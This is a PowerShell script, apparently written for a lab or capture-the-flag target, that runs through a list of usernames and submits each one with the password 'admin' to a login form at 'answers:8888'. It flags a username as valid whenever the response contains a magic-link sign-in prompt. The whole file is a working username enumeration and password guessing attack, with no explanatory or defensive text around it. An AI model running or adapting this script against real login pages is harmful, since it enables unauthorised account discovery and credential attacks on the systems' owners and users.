foreach($username in $(Get-Content usernames.txt)) {
  $method = [Microsoft.PowerShell.Commands.WebRequestMethod]::"POST"
  $URI = [System.Uri]::new("http://answers:8888/login")
  $maximumRedirection = [System.Int32] 0
  $headers = [System.Collections.Generic.Dictionary[string,string]]::new()
  $headers.Add("Host", "answers:8888")
  $userAgent = [System.String]::new("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0")
  $headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
  $headers.Add("Accept-Language", "en-US,en;q=0.5")
  $headers.Add("Accept-Encoding", "gzip, deflate")
  $contentType = [System.String]::new("application/x-www-form-urlencoded")
  $headers.Add("Origin", "http://answers:8888")
  $headers.Add("Referer", "http://answers:8888/login")
  $headers.Add("Upgrade-Insecure-Requests", "1")
  $body = [System.String]::new("username=$username&password=admin&submit=Submit")
  $response = (Invoke-WebRequest -Method $method -Uri $URI -MaximumRedirection $maximumRedirection -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $body)
  if($response.RawContent.contains('/generateMagicLink') -and $response.RawContent.contains('Complex password got you down? Get a magic link and sign in from your email!') )
    {
      Write-Output "$username is a valid username"
    }
}
